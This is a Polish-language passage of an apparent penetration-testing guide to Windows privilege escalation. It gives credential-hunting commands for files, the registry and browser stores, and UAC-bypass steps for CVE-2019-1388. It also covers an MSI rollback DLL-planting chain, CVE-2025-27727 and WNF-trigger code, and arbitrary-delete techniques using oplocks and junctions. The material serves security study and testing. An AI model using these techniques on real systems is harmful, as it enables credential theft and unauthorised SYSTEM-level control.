W standardowym profilu **Default** przeglądarki Edge bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a plik `Local State` w jego katalogu nadrzędnym `User Data`. [Microsoft opisuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` może zmienić tę lokalizację. Sama obecność plików wskazuje jedynie potencjalne miejsce przechowywania poświadczeń: sprawdź, czy pliki są dostępne do odczytu, czy masz kontekst DPAPI właściwego użytkownika lub inne autoryzowane materiały kluczowe oraz czy zapisane logowanie dotyczy konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla podaje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu są odpowiednio plikiem kluczy i plikiem zaszyfrowanych danych logowania. Ich obecność wskazuje jedynie potencjalne miejsce przechowywania poświadczeń: sprawdź, czy oba pliki są dostępne do odczytu, czy zawierają zapisane wpisy i czy klucz jest chroniony hasłem głównym (Primary Password), zanim uznasz, że można użyć tych poświadczeń. Jeśli odzyskane poświadczenie należy do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do kontroli grup oraz uprawnienia grupy do [odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie potwierdzają możliwości uzyskania uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a jego funkcje są udostępniane przez jeden lub więcej interfejsów, identyfikowanych za pomocą identyfikatorów interfejsu (IID).

Klasy i interfejsy COM są zdefiniowane odpowiednio w rejestrze pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

W kluczach CLSID tego rejestru można znaleźć podklucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może mieć wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątku).

![Historia przeglądarek — COM DLL Overwriting: W kluczach CLSID tego rejestru można znaleźć podklucz InProcServer32, który zawiera wartość domyślną wskazującą na DLL oraz wartość...](<../../images/image (729).png>)

Jeśli możesz **nadpisać dowolną z DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli ta DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrwalania dostępu, zobacz:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukiwanie pliku o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia wyszukujące hasła

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to wtyczka msf**. Stworzyłem ją, aby **automatycznie uruchamiać każdy moduł POST Metasploit, który wyszukuje dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** używane przez różne narzędzia, które zapisują te dane w postaci jawnego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP).

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu głównego**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz pobrać **otwarty uchwyt do uprzywilejowanego procesu utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o tym, **jak wykryć i wykorzystać tę lukę**.](leaked-handle-exploitation.md)\
[Przeczytaj [**ten drugi wpis, aby uzyskać pełniejsze wyjaśnienie, jak testować i nadużywać większej liczby otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, nazywane **potokami**, umożliwiają komunikację procesów i przesyłanie danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, nawet przez różne sieci. Przypomina to architekturę klient/serwer, w której wyróżnia się role **serwera named pipe** i **klienta named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go utworzył, może **przejąć tożsamość** **klienta**, jeśli ma wymagane uprawnienia **SeImpersonate**. Znalezienie **uprzywilejowanego procesu**, który komunikuje się przez potok, pod który możesz się podszyć, stwarza możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez ciebie potokiem. Instrukcje przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie pozwala też **przechwytywać komunikację named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a to narzędzie pozwala wyświetlić listę wszystkich potoków i sprawdzić je w poszukiwaniu privesców:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny, uwierzytelniony klient może wykorzystać asynchroniczną ścieżkę zdarzeń opartą na mailslotach, aby zmienić `ClientAttach` w dowolny **4-bajtowy zapis** do istniejącego pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje do tego uchwytu kontrolowane przez atakującego `InitContext` z `Initialize`. Zarejestruj aplikację linii przez `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj aplikację lub zamknij połączenie, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do biblioteki DLL, aby uruchomić `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej informacji:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużywanie handlerów protokołów / ShellExecute przez renderery Markdown

Klikalne linki Markdown przekazane do `ShellExecuteExW` mogą uruchamiać niebezpieczne handlery URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń pod kątem haseł**

Po uzyskaniu shella jako użytkownik mogą być uruchomione zaplanowane zadania lub inne procesy, które **przekazują poświadczenia w wierszu poleceń**. Poniższy skrypt co dwie sekundy przechwytuje wiersze poleceń procesów i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a funkcja UAC jest włączona, w niektórych wersjach systemu Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM” z poziomu użytkownika bez uprawnień.

Dzięki tej samej luce można jednocześnie eskalować uprawnienia i ominąć UAC. Ponadto nie trzeba niczego instalować, a plik binarny używany w tym procesie jest podpisany i wydany przez Microsoft.

Do niektórych podatnych systemów należą:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w tym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu Administratora Medium do High Integrity Level / UAC Bypass

Przeczytaj ten tekst, aby **poznać poziomy integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj ten tekst, aby poznać UAC i sposoby jego omijania:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Przekierowanie katalogu upload do katalogu udostępnianego przez serwer

Aplikacja może tworzyć przewidywalny podkatalog upload, zapisywać w nim plik o nazwie podanej przez użytkownika, a następnie go przetwarzać. Jeśli użytkownik o niskich uprawnieniach może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może zostać przekierowany przez junction do katalogu udostępnianego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi WWW, jeśli serwer wykonuje pliki tego typu. Jest to zależna od konkretnej aplikacji granica dowolnego zapisu; sam fakt, że katalog upload jest zapisywalny lub zawiera już junction, nie stanowi dowodu.

Sprawdź dokładny sposób konstruowania ścieżki i moment zapisu w obsłudze uploadu, efektywne uprawnienia użytkownika do usunięcia i utworzenia podkatalogu, efektywne ACL miejsca docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w katalogu docelowym. Osobno potwierdź tożsamość procesu zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać ACL katalogu i metadane reparse point, ale nie pozwala ustalić działania handlera ani potwierdzić przyszłej podmiany junction. Jeśli plik zostanie wykonany w kontekście konta usługi, przed rozważeniem odrębnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Wyzwalane przez WNF czyszczenie uprzywilejowanego zaplanowanego zadania

Zaplanowane zadanie, które blokuje ręczne uruchomienie, może nadal udostępniać nieuprzywilejowany mechanizm wyzwalania. Podczas audytu uprzywilejowanego zadania wyeksportuj jego XML i sprawdź **wszystkie** wyzwalacze, a także DACL zadania, principal i akcję. W szczególności `WnfStateChangeTrigger` wskazuje stan Windows Notification Facility (WNF); jeśli bieżący użytkownik może publikować aktualizacje tego zabezpieczanego stanu, może pośrednio uruchomić zadanie z skonfigurowaną tożsamością, mimo że ustawiono `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na przykład zadanie Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` działało jako SYSTEM, przyjmowało od zwykłego użytkownika aktualizacje stanu WNF `7508BCA32C079E41`, a następnie sprawdzało `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, nawet gdy Recall było wyłączone.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Aby sprawdzić osiągalność, pobierz adres `ZwUpdateWnfStateData` z `ntdll.dll`, wyślij pustą aktualizację dla ośmiobajtowej nazwy stanu i skoreluj kod zwrotny z danymi o ostatnim uruchomieniu zadania lub aktywnością Procmon. Poniższa uproszczona sonda używa sekwencji bajtów z przykładu zadania Recall; zastąp ją bajtami wyeksportowanymi dla testowanego zadania.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Przekształcanie rekurencyjnego czyszczenia w uprzywilejowane usuwanie

Przydatnym prymitywem nie jest sam wyzwalacz, lecz uprzywilejowana procedura czyszczenia, która przyjmuje katalog kontrolowany przez atakującego. Prześledź operację od enumeracji po końcową modyfikację: wykrywanie profili/sesji, dzieci wybrane przez wildcard, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` to mocne przesłanki, że wcześniej sprawdzona ścieżka zostanie później przejrzana rekurencyjnie. Jeśli elementy potomne nie są otwierane względem zaufanych uchwytów katalogów i weryfikowane przed usunięciem, atakujący może zmienić sposób rozwiązywania ścieżki między enumeracją a użyciem.<sup>[[43]](#references)</sup>

Połącz wyzwalacz WNF z opisaną poniżej [podmianą oplock, junction i dowiązania symbolicznego Object Manager](#from-folder-contents-delete-to-system-eop): oplock wstrzymuje proces czyszczenia po wybraniu przez niego prawidłowego elementu potomnego, a następnie zapisywalny katalog nadrzędny zostaje podmieniony, aby wznowione uprzywilejowane usuwanie rozwiązało ścieżkę przez `\RPC Control` do chronionego celu. W łańcuchu Recall doprowadziło to do usunięcia przez SYSTEM `C:\Config.Msi`, wymaganego przez opisaną technikę wycofywania MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Zagnieżdżone elementy potomne omijają płytkie poprawki dotyczące reparse point

Samo sprawdzenie kontrolowanego przez atakującego katalogu głównego i jego bezpośredniego elementu potomnego nie zabezpiecza rekurencyjnego usuwania opartego na ścieżkach. Pozostaw te sprawdzone obiekty bez zmian i przenieś podmianę junction/oplock do dodatkowego elementu potomnego poniżej nich; `IFileOperation::DeleteItem` ostatecznie dotrze do nieweryfikowanego elementu potomnego i podąży za jego nowym celem. CVE-2026-20941 powstało właśnie w wyniku tego rodzaju niekompletnej poprawki: pierwsza poprawka Recall weryfikowała `UKP` i katalog o nazwie w formacie GUID, ale pozostawiała starą operację rekurencyjnego usuwania.<sup>[[43]](#references)</sup>

Bezpieczny wzorzec polega na otwarciu **każdego elementu potomnego** względem już zaufanego uchwytu katalogu, pobraniu i zweryfikowaniu końcowej rozstrzygniętej ścieżki/obiektu, a następnie zastosowaniu dyspozycji usunięcia do tego zweryfikowanego uchwytu. Nie weryfikuj prefiksu, a potem nie wracaj do rekurencyjnego usuwania opartego na ścieżkach. Podczas przeglądu poprawek sprawdzaj też struktury w rzeczywistym miejscu wywołania: w tym przypadku inspekcja działania programu wykazała, że `OBJECT_ATTRIBUTES` przekazywany do `NtCreateFile` zawierał niepusty `RootDirectory` oraz względną nazwę `{GUID}\\secure_file.lock`, co obaliło mylący wynik dekompilacji sugerujący istnienie drugiego prymitywu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), a kod exploit jest [**dostępny tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji wycofywania Windows Installer, aby podczas procesu odinstalowywania zastąpić prawidłowe pliki złośliwymi. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia katalogu `C:\Config.Msi`. Windows Installer użyje go później do przechowywania plików wycofywania podczas odinstalowywania innych pakietów MSI, a pliki te zostaną zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM Windows Installer (CVE-2025-27727)

Klient o niskich uprawnieniach może uzyskać dostęp do usługi SYSTEM `msiexec.exe` za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła zidentyfikować odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` pod offsetem `0xA0` w vtable, `SetEEUIDirectoryAndFilter` pod `0xC8` oraz `CleanupTempPackages` pod `0x50`. Nazwy i offsety zostały ustalone w wyniku inżynierii wstecznej i mogą się różnić między kompilacjami.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` podszywa się pod klienta tylko na czas otwierania podanej ścieżki z uprawnieniem `DELETE` oraz flagami `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Potwierdza to, że klient może usunąć katalog, i zapobiega podążaniu za reparse point, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` funkcja `SetEEUIDirectoryAndFilter` planuje ścieżkę jako folder, niezależnie od argumentu filtra przekazanego przez klienta. Usługa zapisuje nazwaną wartość `REG_DWORD` w `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwa wartości to ścieżka kontrolowana przez klienta, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio uruchamia czyszczenie. Jej uprzywilejowany wątek roboczy wylicza wartości rejestru i przekazuje wpisy folderów do rekurencyjnej funkcji `FDeleteFolder`, nie sprawdzając pochodzenia ścieżki. Jeśli zwykłe usuwanie się nie powiedzie, kod wywołuje również `LockdownPath`, czyści atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odtworzona z `msi.dll` to:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Przydatnym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie za pomocą junction. Zarejestruj utworzone przez atakującego `C:\Config.Msi`, usuń je i pozwól Windows Installerowi później odtworzyć tę samą ścieżkę z chronionymi danymi rollback. Podczas czyszczenia zaufana jest nieaktualna nazwa `TempPackages`, więc nowy katalog zostaje usunięty jako SYSTEM. To omija zamierzoną ochronę zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do opisanego poniżej łańcucha rollback: zachowaj osobny wpis `Installer\Folders`, usuń chroniony katalog `C:\Config.Msi`, odtwórz go z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC`, otwarty przed zaostrzeniem DACL przez instalator. Wstępnie otwarty uchwyt może przywrócić liberalną DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić przed wznowieniem rollback.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa funkcja ochronna. Wywołanie COM może nadal zwracać powodzenie, ale ścieżka kontrolowana przez atakującego nie jest już dodawana do `TempPackages`. Zainstaluj aktualizacje zabezpieczeń Windows z kwietnia 2025 r., zamiast traktować pomyślny wynik metody jako test poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowanie techniki:

1. **Etap 1 – Przygotowanie hijack (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby mógł go uruchomić **użytkownik bez uprawnień administratora**.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Monitoruj otwarty uchwyt pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć moment, gdy plik zmieni ścieżkę na `C:\Config.Msi\<random>.rbf`.

- Krok 3: Własna synchronizacja
    - Plik `.msi` zawiera **własną akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **uniemożliwi to jego usunięcie**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **katalog `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ręcznie usuń plik `.rbf`.
    - Teraz **katalog `C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **uruchom podatność umożliwiającą usunięcie dowolnego folderu na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Podmiana skryptów rollback na złośliwe**

- Krok 6: Odtwórz `C:\Config.Msi` ze słabymi ACL
    - Samodzielnie odtwórz folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, ustawiając:
        - `TARGETDIR`: zapisywalna lokalizacja.
        - `ERROROUT`: zmienna, która wymusza niepowodzenie.
    - Ta instalacja posłuży do ponownego uruchomienia **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` do momentu pojawienia się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed rollback
    - Plik `.msi` zawiera **własną akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje utworzenie pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj słabe ACL
    - Po otrzymaniu zdarzenia `plik .rbs utworzony`:
        - Windows Installer **ponownie stosuje silne ACL** do `C:\Config.Msi`.
        - Ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie zastosować słabe ACL**.

> ACL są **sprawdzane tylko przy otwieraniu uchwytu**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Nadpisz plik `.rbs` **fałszywym skryptem rollback**, który każe Windows:
        - Przywrócić plik `.rbf` (złośliwą bibliotekę DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść własny plik `.rbf` zawierający **złośliwą bibliotekę DLL z payloadem działającym na poziomie SYSTEM**.

- Krok 12: Uruchom rollback
    - Zasygnalizuj zdarzenie synchronizacji, aby instalator wznowił działanie.
    - Skonfigurowano **własną akcję typu 19 (`ErrorOut`)**, która **celowo powoduje niepowodzenie instalacji** w znanym momencie.
    - To powoduje **rozpoczęcie rollback**.

- Krok 13: SYSTEM instaluje Twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje bibliotekę DLL `.rbf` do lokalizacji docelowej.
    - Masz teraz **złośliwą bibliotekę DLL w ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Wykonaj kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą bibliotekę DLL.
    - **Gotowe**: Twój kod zostaje wykonany **jako SYSTEM**.


### Od usuwania/przenoszenia/zmiany nazw dowolnych plików do SYSTEM EoP

Główna technika MSI rollback (opisana wyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **usuwanie dowolnych plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usunie cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych interfejsów API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli Twój prymityw nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- W środku utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- **Oplock wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Wyzwól proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usuwać ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Spowoduje to opróżnienie `folder1` bez zrywania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplocka.

- Opcja B: Zamień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

